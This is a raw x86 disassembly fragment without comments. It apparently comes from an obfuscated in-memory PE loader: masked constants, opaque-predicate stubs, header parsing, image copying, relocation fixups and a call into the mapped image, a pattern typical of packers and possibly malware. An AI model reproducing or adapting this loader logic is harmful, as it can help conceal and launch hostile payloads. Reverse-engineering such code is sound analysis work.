  41e059:	xor    eax,ebx
  41e05b:	add    eax,esi
  41e05d:	imul   eax,ecx
  41e060:	mov    ecx,DWORD PTR [ebp-0x4c]
  41e063:	xor    ecx,ebx
  41e065:	add    eax,ecx
  41e067:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e06a:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41e072:	mov    ecx,DWORD PTR [ebp-0xac]
  41e078:	xor    ecx,ebx
  41e07a:	lea    eax,[ecx+eax*1+0x3272e2]
  41e081:	movzx  ecx,BYTE PTR [ebp-0x1]
  41e085:	xor    ecx,eax
  41e087:	mov    BYTE PTR [ebp-0x1],cl
  41e08a:	mov    al,BYTE PTR [ebp-0x1]
  41e08d:	mov    ecx,DWORD PTR [ebp-0x8]
  41e090:	mov    edx,DWORD PTR [ebp-0x18]
  41e093:	xor    ecx,ebx
  41e095:	add    ecx,esi
  41e097:	imul   ecx,edx
  41e09a:	mov    edx,DWORD PTR [ebp-0x1c]
  41e09d:	mov    BYTE PTR [ecx+edx*1],al
  41e0a0:	mov    eax,DWORD PTR [ebp-0x8]
  41e0a3:	mov    ecx,DWORD PTR [ebp-0x18]
  41e0a6:	xor    eax,ebx
  41e0a8:	add    eax,esi
  41e0aa:	imul   eax,ecx
  41e0ad:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e0b0:	mov    al,BYTE PTR [eax+ecx*1]
  41e0b3:	mov    BYTE PTR [ebp-0x1],al
  41e0b6:	mov    eax,DWORD PTR [ebp-0x8]
  41e0b9:	mov    ecx,DWORD PTR [ebp-0x18]
  41e0bc:	xor    eax,ebx
  41e0be:	add    eax,esi
  41e0c0:	imul   eax,ecx
  41e0c3:	mov    ecx,DWORD PTR [ebp-0x10]
  41e0c6:	xor    ecx,ebx
  41e0c8:	add    eax,ecx
  41e0ca:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e0cd:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41e0d5:	mov    ecx,DWORD PTR [ebp-0x9c]
  41e0db:	xor    ecx,ebx
  41e0dd:	lea    eax,[ecx+eax*1+0x3272e2]
  41e0e4:	movzx  ecx,BYTE PTR [ebp-0x1]
  41e0e8:	xor    ecx,eax
  41e0ea:	mov    BYTE PTR [ebp-0x1],cl
  41e0ed:	mov    al,BYTE PTR [ebp-0x1]
  41e0f0:	mov    ecx,DWORD PTR [ebp-0x8]
  41e0f3:	mov    edx,DWORD PTR [ebp-0x18]
  41e0f6:	xor    ecx,ebx
  41e0f8:	add    ecx,esi
  41e0fa:	imul   ecx,edx
  41e0fd:	mov    edx,DWORD PTR [ebp-0x1c]
  41e100:	mov    BYTE PTR [ecx+edx*1],al
  41e103:	mov    eax,DWORD PTR [ebp-0x34]
  41e106:	mov    ecx,DWORD PTR [ebp-0x10]
  41e109:	xor    eax,ebx
  41e10b:	xor    ecx,ebx
  41e10d:	add    eax,esi
  41e10f:	add    ecx,esi
  41e111:	imul   eax,ecx
  41e114:	add    eax,DWORD PTR [ebp-0x18]
  41e117:	mov    DWORD PTR [ebp-0x18],eax
  41e11a:	mov    eax,DWORD PTR [ebp-0x18]
  41e11d:	mov    ecx,DWORD PTR [ebp-0x20]
  41e120:	cmp    ecx,eax
  41e122:	jb     0x41e029
  41e128:	mov    eax,DWORD PTR [ebp-0x10]
  41e12b:	mov    ecx,DWORD PTR [ebp-0x20]
  41e12e:	xor    eax,ebx
  41e130:	add    eax,esi
  41e132:	imul   eax,ecx
  41e135:	mov    ecx,DWORD PTR [ebp-0x54]
  41e138:	xor    ecx,ebx
  41e13a:	add    ecx,esi
  41e13c:	or     eax,ecx
  41e13e:	mov    ecx,DWORD PTR [ebp-0x30]
  41e141:	xor    ecx,ebx
  41e143:	add    eax,ecx
  41e145:	mov    ecx,DWORD PTR [ebp-0x30]
  41e148:	xor    ecx,ebx
  41e14a:	add    eax,ecx
  41e14c:	mov    ecx,DWORD PTR [ebp-0xc]
  41e14f:	lea    eax,[eax+ecx*1+0x64e5c4]
  41e156:	jmp    0x41e167
  41e158:	mov    eax,DWORD PTR [ebp-0x30]
  41e15b:	mov    ecx,DWORD PTR [ebp-0xc]
  41e15e:	xor    eax,ebx
  41e160:	lea    eax,[eax+ecx*1+0x3272e2]
  41e167:	mov    DWORD PTR [ebp-0xc],eax
  41e16a:	mov    eax,DWORD PTR [ebp-0x30]
  41e16d:	xor    eax,ebx
  41e16f:	mov    ecx,0xffcd8d1e
  41e174:	sub    ecx,eax
  41e176:	add    ecx,DWORD PTR [ebp-0x38]
  41e179:	mov    eax,DWORD PTR [ebp-0x30]
  41e17c:	mov    edx,DWORD PTR [ebp-0xc]
  41e17f:	xor    eax,ebx
  41e181:	add    eax,esi
  41e183:	imul   eax,edx
  41e186:	cmp    eax,ecx
  41e188:	jbe    0x41dfa3
  41e18e:	push   DWORD PTR [ebp+0x8]
  41e191:	mov    eax,DWORD PTR [ebp+0x8]
  41e194:	push   DWORD PTR [eax+0x1cc]
  41e19a:	lea    eax,[ebp-0xa0]
  41e1a0:	push   eax
  41e1a1:	mov    eax,DWORD PTR [ebp+0x8]
  41e1a4:	mov    eax,DWORD PTR [eax+0x1c4]
  41e1aa:	push   DWORD PTR [eax]
  41e1ac:	mov    eax,DWORD PTR [ebp+0x8]
  41e1af:	mov    eax,DWORD PTR [eax+0x1c0]
  41e1b5:	push   DWORD PTR [eax]
  41e1b7:	push   DWORD PTR [ebp-0x3c]
  41e1ba:	push   DWORD PTR [ebp-0x2c]
  41e1bd:	call   0x41ec54
  41e1c2:	mov    DWORD PTR [ebp-0x40],eax
  41e1c5:	mov    eax,DWORD PTR [ebp-0x14]
  41e1c8:	mov    ecx,DWORD PTR [ebp-0x2c]
  41e1cb:	xor    eax,ebx
  41e1cd:	add    eax,esi
  41e1cf:	cmp    eax,ecx
  41e1d1:	je     0x41e1f2
  41e1d3:	mov    eax,DWORD PTR [ebp+0x8]
  41e1d6:	mov    ecx,DWORD PTR [ebp-0x50]
  41e1d9:	mov    eax,DWORD PTR [eax+0x1d8]
  41e1df:	xor    ecx,ebx
  41e1e1:	add    ecx,esi
  41e1e3:	push   ecx
  41e1e4:	mov    ecx,DWORD PTR [ebp-0x14]
  41e1e7:	xor    ecx,ebx
  41e1e9:	add    ecx,esi
  41e1eb:	push   ecx
  41e1ec:	push   DWORD PTR [ebp-0x2c]
  41e1ef:	call   DWORD PTR [eax+0x18]
  41e1f2:	pop    edi
  41e1f3:	pop    esi
  41e1f4:	pop    ebx
  41e1f5:	leave  
  41e1f6:	ret    0x4
  41e1f9:	push   ebp
  41e1fa:	mov    ebp,esp
  41e1fc:	push   ecx
  41e1fd:	push   ecx
  41e1fe:	lea    eax,[ebp-0x8]
  41e201:	mov    DWORD PTR [ebp-0x4],eax
  41e204:	push   esi
  41e205:	mov    esi,DWORD PTR [ebp-0x4]
  41e208:	mov    eax,0xf881ba0f
  41e20d:	mov    DWORD PTR [esi],eax
  41e20f:	mov    esi,DWORD PTR [ebp-0x8]
  41e212:	cmp    esi,eax
  41e214:	pop    esi
  41e215:	jne    0x41e21f
  41e217:	mov    BYTE PTR [ecx+0xa],0x7c
  41e21b:	mov    BYTE PTR [edx+0x8],0x2f
  41e21f:	mov    BYTE PTR [edx+0xa],0x7c
  41e223:	mov    BYTE PTR [ecx+0x2],0x2
  41e227:	leave  
  41e228:	ret    
  41e229:	push   ebp
  41e22a:	mov    ebp,esp
  41e22c:	push   ecx
  41e22d:	push   ecx
  41e22e:	lea    eax,[ebp-0x8]
  41e231:	mov    DWORD PTR [ebp-0x4],eax
  41e234:	mov    edx,DWORD PTR [ebp-0x4]
  41e237:	mov    eax,0xf88b0be3
  41e23c:	mov    DWORD PTR [edx],eax
  41e23e:	mov    edx,DWORD PTR [ebp-0x8]
  41e241:	cmp    edx,eax
  41e243:	jne    0x41e254
  41e245:	mov    eax,DWORD PTR [ebp+0x8]
  41e248:	mov    BYTE PTR [ecx+0x9],0x8
  41e24c:	mov    BYTE PTR [eax+0x7],0x47
  41e250:	mov    BYTE PTR [ecx+0x6],0xf
  41e254:	mov    BYTE PTR [ecx+0x3],0x18
  41e258:	leave  
  41e259:	ret    0x4
  41e25c:	push   ebp
  41e25d:	mov    ebp,esp
  41e25f:	push   ecx
  41e260:	push   ecx
  41e261:	lea    eax,[ebp-0x8]
  41e264:	mov    DWORD PTR [ebp-0x4],eax
  41e267:	mov    edx,DWORD PTR [ebp-0x4]
  41e26a:	mov    eax,0x7e0da0f
  41e26f:	mov    DWORD PTR [edx],eax
  41e271:	mov    edx,DWORD PTR [ebp-0x8]
  41e274:	cmp    edx,eax
  41e276:	jne    0x41e27c
  41e278:	mov    BYTE PTR [ecx+0x7],0x47
  41e27c:	mov    eax,DWORD PTR [ebp+0x8]
  41e27f:	mov    BYTE PTR [ecx+0x1],0x5
  41e283:	mov    BYTE PTR [eax+0x9],0x28
  41e287:	leave  
  41e288:	ret    0x4
  41e28b:	push   ebp
  41e28c:	mov    ebp,esp
  41e28e:	push   ecx
  41e28f:	push   ecx
  41e290:	lea    eax,[ebp-0x8]
  41e293:	mov    DWORD PTR [ebp-0x4],eax
  41e296:	push   esi
  41e297:	mov    esi,DWORD PTR [ebp-0x4]
  41e29a:	mov    eax,0x7060e3e
  41e29f:	mov    DWORD PTR [esi],eax
  41e2a1:	mov    esi,DWORD PTR [ebp-0x8]
  41e2a4:	cmp    esi,eax
  41e2a6:	pop    esi
  41e2a7:	jne    0x41e2b3
  41e2a9:	mov    BYTE PTR [edx+0x4],0x3
  41e2ad:	mov    WORD PTR [ecx+0x3],0x318
  41e2b3:	mov    BYTE PTR [edx],0x3f
  41e2b6:	leave  
  41e2b7:	ret    
  41e2b8:	push   ebp
  41e2b9:	mov    ebp,esp
  41e2bb:	push   ecx
  41e2bc:	push   ecx
  41e2bd:	lea    eax,[ebp-0x8]
  41e2c0:	mov    DWORD PTR [ebp-0x4],eax
  41e2c3:	mov    edx,DWORD PTR [ebp-0x4]
  41e2c6:	mov    eax,0xf8870b3f
  41e2cb:	mov    DWORD PTR [edx],eax
  41e2cd:	mov    edx,DWORD PTR [ebp-0x8]
  41e2d0:	cmp    edx,eax
  41e2d2:	jne    0x41e2df
  41e2d4:	mov    eax,DWORD PTR [ebp+0x8]
  41e2d7:	mov    BYTE PTR [ecx+0x8],0xf
  41e2db:	mov    BYTE PTR [eax+0x1],0x5
  41e2df:	mov    BYTE PTR [ecx+0x5],0xb
  41e2e3:	leave  
  41e2e4:	ret    0x4
  41e2e7:	push   esi
  41e2e8:	mov    ecx,edi
  41e2ea:	call   0x41e2b8
  41e2ef:	mov    edx,edi
  41e2f1:	mov    ecx,esi
  41e2f3:	mov    BYTE PTR [esi],0x1f
  41e2f6:	call   0x41e28b
  41e2fb:	push   esi
  41e2fc:	mov    ecx,edi
  41e2fe:	mov    BYTE PTR [esi+0x5],0xb
  41e302:	call   0x41e25c
  41e307:	push   esi
  41e308:	mov    BYTE PTR [esi+0x6],0xf
  41e30c:	call   0x41e229
  41e311:	mov    BYTE PTR [esi+0x2],0x2
  41e315:	mov    edx,esi
  41e317:	jmp    0x41e1f9
  41e31c:	push   ebp
  41e31d:	mov    ebp,esp
  41e31f:	push   ecx
  41e320:	mov    ecx,DWORD PTR [edx+0x194]
  41e326:	push   esi
  41e327:	mov    esi,DWORD PTR [ebp+0x8]
  41e32a:	mov    esi,DWORD PTR [esi]
  41e32c:	mov    DWORD PTR [ecx],esi
  41e32e:	mov    ecx,DWORD PTR [edx+0x194]
  41e334:	mov    ecx,DWORD PTR [ecx]
  41e336:	mov    esi,DWORD PTR [edx+0x190]
  41e33c:	mov    DWORD PTR [esi],ecx
  41e33e:	mov    eax,DWORD PTR [edx+0x194]
  41e344:	mov    ecx,DWORD PTR [eax]
  41e346:	mov    ecx,DWORD PTR [ecx+0x3c]
  41e349:	add    ecx,DWORD PTR [eax]
  41e34b:	mov    DWORD PTR [ebp-0x4],0xf89ca585
  41e352:	mov    eax,DWORD PTR [ebp-0x4]
  41e355:	movzx  ecx,WORD PTR [ecx+0x16]
  41e359:	xor    eax,0x751089b
  41e35e:	add    eax,0x3272e2
  41e363:	pop    esi
  41e364:	test   ecx,eax
  41e366:	je     0x41e374
  41e368:	mov    eax,DWORD PTR [edx+0x1c8]
  41e36e:	mov    DWORD PTR [eax],0xf89c8584
  41e374:	leave  
  41e375:	ret    0x4
  41e378:	push   ebp
  41e379:	mov    ebp,esp
  41e37b:	sub    esp,0x70
  41e37e:	and    DWORD PTR [ebp-0x20],0x0
  41e382:	mov    DWORD PTR [ebp-0x18],0xf89cb585
  41e389:	mov    DWORD PTR [ebp-0x1c],0xf89c85c5
  41e390:	mov    DWORD PTR [ebp-0x2c],0xf89c85b9
  41e397:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  41e39e:	mov    DWORD PTR [ebp-0x2c],0xf89f0585
  41e3a5:	mov    eax,DWORD PTR [ebp+0x20]
  41e3a8:	mov    eax,DWORD PTR [eax+0x194]
  41e3ae:	mov    DWORD PTR [ebp-0xc],eax
  41e3b1:	mov    eax,DWORD PTR [ebp+0x20]
  41e3b4:	push   ebx
  41e3b5:	push   esi
  41e3b6:	mov    esi,DWORD PTR [eax+0x190]
  41e3bc:	mov    eax,DWORD PTR [ebp+0x20]
  41e3bf:	mov    eax,DWORD PTR [eax+0x18c]
  41e3c5:	mov    DWORD PTR [ebp-0x8],eax
  41e3c8:	mov    eax,DWORD PTR [eax]
  41e3ca:	push   edi
  41e3cb:	mov    DWORD PTR [ebp-0x4],esi
  41e3ce:	test   eax,eax
  41e3d0:	jne    0x41e3dd
  41e3d2:	push   DWORD PTR [ebp+0x1c]
  41e3d5:	mov    edx,DWORD PTR [ebp+0x20]
  41e3d8:	call   0x41e31c
  41e3dd:	mov    eax,DWORD PTR [esi]
  41e3df:	mov    ebx,DWORD PTR [esi]
  41e3e1:	add    ebx,DWORD PTR [eax+0x3c]
  41e3e4:	mov    eax,DWORD PTR [ebp+0xc]
  41e3e7:	mov    ecx,DWORD PTR [ebp-0x8]
  41e3ea:	mov    ecx,DWORD PTR [ecx]
  41e3ec:	mov    esi,0x751089b
  41e3f1:	xor    eax,esi
  41e3f3:	mov    edi,0x3272e2
  41e3f8:	add    eax,edi
  41e3fa:	cmp    eax,ecx
  41e3fc:	jne    0x41e634
  41e402:	mov    eax,DWORD PTR [ebp-0xc]
  41e405:	mov    eax,DWORD PTR [eax]
  41e407:	mov    DWORD PTR [ebp-0x10],eax
  41e40a:	mov    eax,DWORD PTR [ebx+0x50]
  41e40d:	mov    DWORD PTR [ebp-0x68],eax
  41e410:	mov    eax,DWORD PTR [ebp-0x18]
  41e413:	xor    eax,esi
  41e415:	add    eax,edi
  41e417:	mov    DWORD PTR [ebp-0x64],eax
  41e41a:	mov    eax,DWORD PTR [ebp-0x14]
  41e41d:	and    DWORD PTR [ebp-0x6c],0x0
  41e421:	xor    eax,esi
  41e423:	add    eax,edi
  41e425:	mov    DWORD PTR [ebp-0x60],eax
  41e428:	lea    eax,[ebp-0x70]
  41e42b:	push   eax
  41e42c:	mov    eax,DWORD PTR [ebp+0x8]
  41e42f:	xor    eax,esi
  41e431:	add    eax,edi
  41e433:	push   eax
  41e434:	mov    eax,DWORD PTR [ebp+0x20]
  41e437:	add    eax,0xaa
  41e43c:	push   eax
  41e43d:	mov    eax,DWORD PTR [ebp+0x20]
  41e440:	mov    eax,DWORD PTR [eax+0x198]
  41e446:	mov    DWORD PTR [ebp-0x70],0x4
  41e44d:	push   DWORD PTR [eax]
  41e44f:	mov    eax,DWORD PTR [ebp+0x10]
  41e452:	call   eax
  41e454:	mov    ecx,DWORD PTR [ebp-0xc]
  41e457:	mov    ecx,DWORD PTR [ecx]
  41e459:	mov    edx,DWORD PTR [ebp-0x8]
  41e45c:	mov    DWORD PTR [ebp-0x6c],eax
  41e45f:	mov    DWORD PTR [ebp+0x1c],eax
  41e462:	mov    DWORD PTR [edx],ecx
  41e464:	mov    ecx,DWORD PTR [ebp-0x4]
  41e467:	mov    DWORD PTR [ecx],eax
  41e469:	mov    eax,DWORD PTR [ebx+0x50]
  41e46c:	mov    DWORD PTR [ebp-0x68],eax
  41e46f:	mov    eax,DWORD PTR [ebp-0x1c]
  41e472:	xor    eax,esi
  41e474:	add    eax,edi
  41e476:	mov    DWORD PTR [ebp-0x64],eax
  41e479:	lea    eax,[ebp-0x20]
  41e47c:	mov    DWORD PTR [ebp-0x60],eax
  41e47f:	lea    eax,[ebp-0x70]
  41e482:	push   eax
  41e483:	mov    eax,DWORD PTR [ebp+0x8]
  41e486:	xor    eax,esi
  41e488:	add    eax,edi
  41e48a:	push   eax
  41e48b:	mov    eax,DWORD PTR [ebp+0x20]
  41e48e:	add    eax,0xee
  41e493:	push   eax
  41e494:	mov    eax,DWORD PTR [ebp+0x20]
  41e497:	mov    eax,DWORD PTR [eax+0x198]
  41e49d:	mov    DWORD PTR [ebp-0x70],0x4
  41e4a4:	push   DWORD PTR [eax]
  41e4a6:	mov    eax,DWORD PTR [ebp+0x10]
  41e4a9:	call   eax
  41e4ab:	test   eax,eax
  41e4ad:	je     0x41e4d2
  41e4af:	and    DWORD PTR [ebp+0xc],0x0
  41e4b3:	cmp    DWORD PTR [ebx+0x50],0x0
  41e4b7:	jbe    0x41e4d2
  41e4b9:	mov    eax,DWORD PTR [ebp+0x1c]
  41e4bc:	mov    ecx,DWORD PTR [ebp-0x10]
  41e4bf:	sub    ecx,eax
  41e4c1:	mov    dl,BYTE PTR [ecx+eax*1]
  41e4c4:	inc    DWORD PTR [ebp+0xc]
  41e4c7:	mov    BYTE PTR [eax],dl
  41e4c9:	mov    edx,DWORD PTR [ebp+0xc]
  41e4cc:	inc    eax
  41e4cd:	cmp    edx,DWORD PTR [ebx+0x50]
  41e4d0:	jb     0x41e4c1
  41e4d2:	mov    edx,DWORD PTR [ebp+0x1c]
  41e4d5:	mov    ecx,DWORD PTR [edx+0x3c]
  41e4d8:	add    ecx,edx
  41e4da:	mov    eax,DWORD PTR [ecx+0xa0]
  41e4e0:	mov    ebx,DWORD PTR [ecx+0x28]
  41e4e3:	add    eax,edx
  41e4e5:	sub    edx,DWORD PTR [ebp-0x10]
  41e4e8:	add    ebx,DWORD PTR [ebp+0x1c]
  41e4eb:	mov    DWORD PTR [ebp+0xc],edx
  41e4ee:	mov    DWORD PTR [ebp-0x2c],ecx
  41e4f1:	mov    DWORD PTR [ebp-0x14],ebx
  41e4f4:	mov    DWORD PTR [ebp-0x8],0x0
  41e4fb:	jmp    0x41e577
  41e4fd:	add    edx,0xfffffff8
  41e500:	shr    edx,1
  41e502:	mov    DWORD PTR [ebp-0x18],edx
  41e505:	je     0x41e563
  41e507:	lea    edx,[eax+0x8]
  41e50a:	mov    DWORD PTR [ebp-0x4],edx
  41e50d:	mov    edx,DWORD PTR [ebp-0x18]
  41e510:	mov    DWORD PTR [ebp-0x18],edx
  41e513:	mov    edx,DWORD PTR [ebp-0x4]
  41e516:	movzx  edx,WORD PTR [edx]
  41e519:	mov    DWORD PTR [ebp-0x24],edx
  41e51c:	and    edx,0xfff
  41e522:	mov    DWORD PTR [ebp-0x28],edx
  41e525:	mov    edx,DWORD PTR [ebp-0x24]
  41e528:	shr    edx,0xc
  41e52b:	add    edx,0xffcd8d1e
  41e531:	xor    edx,esi
  41e533:	cmp    edx,0xf89c85ba
  41e539:	jne    0x41e55a
  41e53b:	mov    edx,DWORD PTR [ebp-0x28]
  41e53e:	add    edx,DWORD PTR [ebp+0x1c]
  41e541:	mov    ebx,DWORD PTR [eax]
  41e543:	cmp    DWORD PTR [ebx+edx*1],0x0
  41e547:	je     0x41e557
  41e549:	mov    ecx,DWORD PTR [ebp+0xc]
  41e54c:	add    ecx,DWORD PTR [ebx+edx*1]
  41e54f:	mov    ebx,DWORD PTR [eax]
  41e551:	mov    DWORD PTR [edx+ebx*1],ecx
  41e554:	mov    ecx,DWORD PTR [ebp-0x2c]
  41e557:	mov    ebx,DWORD PTR [ebp-0x14]
  41e55a:	add    DWORD PTR [ebp-0x4],0x2
  41e55e:	dec    DWORD PTR [ebp-0x18]
  41e561:	jne    0x41e513
  41e563:	mov    edx,DWORD PTR [ebp-0xc]
  41e566:	add    DWORD PTR [ebp-0x8],edx
  41e569:	mov    edx,DWORD PTR [ebp-0x8]
  41e56c:	cmp    edx,DWORD PTR [ecx+0xa4]
  41e572:	jae    0x41e585
  41e574:	add    eax,DWORD PTR [ebp-0xc]
  41e577:	mov    edx,DWORD PTR [eax+0x4]
  41e57a:	mov    DWORD PTR [ebp-0xc],edx
  41e57d:	test   edx,edx
  41e57f:	jne    0x41e4fd
  41e585:	mov    eax,DWORD PTR [ebp-0x10]
  41e588:	mov    DWORD PTR [ebp-0x6c],eax
  41e58b:	mov    DWORD PTR [ebp-0x70],0x4
  41e592:	mov    eax,DWORD PTR [ecx+0x50]
  41e595:	mov    DWORD PTR [ebp-0x68],eax
  41e598:	mov    eax,DWORD PTR [ebp-0x1c]
  41e59b:	xor    eax,esi
  41e59d:	add    eax,edi
  41e59f:	mov    DWORD PTR [ebp-0x64],eax
  41e5a2:	lea    eax,[ebp-0x20]
  41e5a5:	mov    DWORD PTR [ebp-0x60],eax
  41e5a8:	lea    eax,[ebp-0x70]
  41e5ab:	push   eax
  41e5ac:	mov    eax,DWORD PTR [ebp+0x8]
  41e5af:	xor    eax,esi
  41e5b1:	add    eax,edi
  41e5b3:	push   eax
  41e5b4:	mov    eax,DWORD PTR [ebp+0x20]
  41e5b7:	add    eax,0xee
  41e5bc:	push   eax
  41e5bd:	mov    eax,DWORD PTR [ebp+0x20]
  41e5c0:	mov    eax,DWORD PTR [eax+0x198]
  41e5c6:	push   DWORD PTR [eax]
  41e5c8:	mov    eax,DWORD PTR [ebp+0x10]
  41e5cb:	call   eax
  41e5cd:	mov    eax,DWORD PTR [ebp+0x20]
  41e5d0:	mov    eax,DWORD PTR [eax+0x180]
  41e5d6:	add    eax,DWORD PTR [ebp+0xc]
  41e5d9:	mov    ecx,DWORD PTR [ebp+0xc]
  41e5dc:	push   DWORD PTR [ebp+0x18]
  41e5df:	mov    DWORD PTR [eax],ecx
  41e5e1:	push   DWORD PTR [ebp+0x14]
  41e5e4:	push   DWORD PTR [ebp+0x1c]
  41e5e7:	call   ebx
  41e5e9:	mov    ecx,DWORD PTR [ebp+0xc]
  41e5ec:	add    ecx,DWORD PTR [ebp+0x20]
  41e5ef:	lea    eax,[ebp+0x4]
  41e5f2:	mov    DWORD PTR [ebp+0x20],ecx
  41e5f5:	mov    ecx,DWORD PTR [ebp+0x20]
  41e5f8:	mov    ecx,DWORD PTR [ebp+0x20]
  41e5fb:	mov    edx,DWORD PTR [ecx+0x190]
  41e601:	mov    ecx,DWORD PTR [ebp+0x20]
  41e604:	mov    ecx,DWORD PTR [ecx+0x18c]
  41e60a:	mov    esi,DWORD PTR [ecx]
  41e60c:	cmp    DWORD PTR [eax],esi
  41e60e:	jb     0x41e62f
  41e610:	mov    esi,DWORD PTR [edx]
  41e612:	mov    edi,DWORD PTR [edx]
  41e614:	mov    esi,DWORD PTR [esi+0x3c]
  41e617:	lea    esi,[edi+esi*1+0x50]
  41e61b:	mov    edi,DWORD PTR [ecx]
  41e61d:	add    edi,DWORD PTR [esi]
  41e61f:	cmp    DWORD PTR [eax],edi
  41e621:	jae    0x41e62f
  41e623:	mov    esi,DWORD PTR [ecx]
  41e625:	mov    ecx,DWORD PTR [eax]
  41e627:	mov    edx,DWORD PTR [edx]
  41e629:	sub    ecx,esi
  41e62b:	add    edx,ecx
  41e62d:	mov    DWORD PTR [eax],edx
  41e62f:	mov    eax,DWORD PTR [ebp+0xc]
  41e632:	jmp    0x41e636
  41e634:	xor    eax,eax
  41e636:	pop    edi
  41e637:	pop    esi
  41e638:	pop    ebx
  41e639:	leave  
  41e63a:	ret    0x1c
  41e63d:	push   ebp
  41e63e:	mov    ebp,esp
  41e640:	sub    esp,0x1c
  41e643:	push   esi
  41e644:	mov    esi,eax
  41e646:	mov    eax,DWORD PTR [ecx+0x190]
  41e64c:	cmp    DWORD PTR [eax],0x0
  41e64f:	je     0x41e75f
  41e655:	test   edx,edx
  41e657:	je     0x41e75f
  41e65d:	test   esi,esi
  41e65f:	je     0x41e75f
  41e665:	mov    eax,DWORD PTR [esi+0x88]
  41e66b:	test   eax,eax
  41e66d:	je     0x41e75a
  41e673:	cmp    DWORD PTR [esi+0x8c],0x10
  41e67a:	je     0x41e75a
  41e680:	cmp    DWORD PTR [esi+0x34],edx
  41e683:	je     0x41e75a
  41e689:	mov    esi,DWORD PTR [ecx+0x18c]
  41e68f:	and    DWORD PTR [ebp-0x10],0x0
  41e693:	mov    ecx,edx
  41e695:	sub    ecx,DWORD PTR [esi]
  41e697:	add    eax,edx
  41e699:	movzx  edx,WORD PTR [eax+0xc]
  41e69d:	mov    DWORD PTR [ebp-0x1c],ecx
  41e6a0:	movzx  ecx,WORD PTR [eax+0xe]
  41e6a4:	add    ecx,edx
  41e6a6:	je     0x41e75a
  41e6ac:	lea    ecx,[eax+0x14]
  41e6af:	push   ebx
  41e6b0:	mov    DWORD PTR [ebp-0x18],ecx
  41e6b3:	mov    esi,0x7fffffff
  41e6b8:	push   edi
  41e6b9:	test   DWORD PTR [ecx],esi
  41e6bb:	je     0x41e73c
  41e6bd:	mov    edx,DWORD PTR [ecx]
  41e6bf:	and    DWORD PTR [ebp-0xc],0x0
  41e6c3:	and    edx,esi
  41e6c5:	add    edx,eax
  41e6c7:	movzx  edi,WORD PTR [edx+0xe]
  41e6cb:	movzx  ebx,WORD PTR [edx+0xc]
  41e6cf:	add    edi,ebx
  41e6d1:	je     0x41e73c
  41e6d3:	lea    ecx,[edx+0x14]
  41e6d6:	mov    DWORD PTR [ebp-0x14],ecx
  41e6d9:	test   DWORD PTR [ecx],esi
  41e6db:	je     0x41e71e
  41e6dd:	mov    ecx,DWORD PTR [ecx]
  41e6df:	and    DWORD PTR [ebp-0x8],0x0
  41e6e3:	and    ecx,esi
  41e6e5:	add    ecx,eax
  41e6e7:	movzx  edi,WORD PTR [ecx+0xe]
  41e6eb:	movzx  ebx,WORD PTR [ecx+0xc]
  41e6ef:	add    edi,ebx
  41e6f1:	je     0x41e71e
  41e6f3:	lea    edi,[ecx+0x14]
  41e6f6:	mov    DWORD PTR [ebp-0x4],edi
  41e6f9:	mov    edi,DWORD PTR [ebp-0x4]
  41e6fc:	mov    edi,DWORD PTR [edi]
  41e6fe:	test   edi,edi
  41e700:	je     0x41e708
  41e702:	mov    ebx,DWORD PTR [ebp-0x1c]
  41e705:	add    DWORD PTR [edi+eax*1],ebx
  41e708:	movzx  edi,WORD PTR [ecx+0xe]
  41e70c:	movzx  ebx,WORD PTR [ecx+0xc]
  41e710:	inc    DWORD PTR [ebp-0x8]
  41e713:	add    DWORD PTR [ebp-0x4],0x8
  41e717:	add    edi,ebx
  41e719:	cmp    DWORD PTR [ebp-0x8],edi
  41e71c:	jb     0x41e6f9
  41e71e:	movzx  edi,WORD PTR [edx+0xe]
  41e722:	movzx  ebx,WORD PTR [edx+0xc]
  41e726:	mov    ecx,DWORD PTR [ebp-0x14]
  41e729:	inc    DWORD PTR [ebp-0xc]
  41e72c:	add    ecx,0x8
  41e72f:	add    edi,ebx
  41e731:	mov    DWORD PTR [ebp-0x14],ecx
  41e734:	cmp    DWORD PTR [ebp-0xc],edi
  41e737:	jb     0x41e6d9
  41e739:	mov    ecx,DWORD PTR [ebp-0x18]
  41e73c:	movzx  edx,WORD PTR [eax+0xe]
  41e740:	movzx  edi,WORD PTR [eax+0xc]
  41e744:	inc    DWORD PTR [ebp-0x10]
  41e747:	add    ecx,0x8
  41e74a:	add    edx,edi
  41e74c:	mov    DWORD PTR [ebp-0x18],ecx
  41e74f:	cmp    DWORD PTR [ebp-0x10],edx
  41e752:	jb     0x41e6b9
  41e758:	pop    edi
  41e759:	pop    ebx
  41e75a:	xor    eax,eax
  41e75c:	inc    eax
  41e75d:	jmp    0x41e761
  41e75f:	xor    eax,eax
  41e761:	pop    esi
  41e762:	leave  
  41e763:	ret    
  41e764:	push   ebp
  41e765:	mov    ebp,esp
  41e767:	mov    ecx,DWORD PTR [ecx+0x190]
  41e76d:	mov    eax,DWORD PTR [ebp+0xc]
  41e770:	sub    esp,0x10
  41e773:	push   ebx
  41e774:	xor    ebx,ebx
  41e776:	push   esi
  41e777:	push   edi
  41e778:	cmp    DWORD PTR [ecx],ebx
  41e77a:	je     0x41e802
  41e780:	cmp    eax,ebx
  41e782:	je     0x41e802
  41e784:	cmp    DWORD PTR [eax+0x78],ebx
  41e787:	jne    0x41e78e
  41e789:	xor    eax,eax
  41e78b:	inc    eax
  41e78c:	jmp    0x41e804
  41e78e:	mov    eax,DWORD PTR [eax+0x78]
  41e791:	add    eax,DWORD PTR [ebp+0x8]
  41e794:	mov    ecx,DWORD PTR [eax+0x1c]
  41e797:	mov    edx,DWORD PTR [eax+0x24]
  41e79a:	mov    esi,DWORD PTR [eax+0x14]
  41e79d:	mov    edi,DWORD PTR [eax+0x18]
  41e7a0:	add    ecx,DWORD PTR [ebp+0x8]
  41e7a3:	add    edx,DWORD PTR [ebp+0x8]
  41e7a6:	mov    DWORD PTR [ebp-0x4],esi
  41e7a9:	cmp    esi,edi
  41e7ab:	ja     0x41e7b0
  41e7ad:	mov    DWORD PTR [ebp-0x4],edi
  41e7b0:	mov    DWORD PTR [ebp-0x8],ebx
  41e7b3:	cmp    DWORD PTR [ebp-0x4],ebx
  41e7b6:	jbe    0x41e789
  41e7b8:	cmp    ebx,DWORD PTR [eax+0x14]
  41e7bb:	jae    0x41e7c3
